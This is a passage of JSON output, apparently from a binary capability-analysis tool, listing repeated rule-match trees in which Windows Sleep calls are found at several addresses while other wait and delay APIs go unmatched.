                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442463968
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442464006
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442468459
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442468464
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442469678
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442469688
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442469723
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442469733
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442469751
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442469761
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442470340
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442470345
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
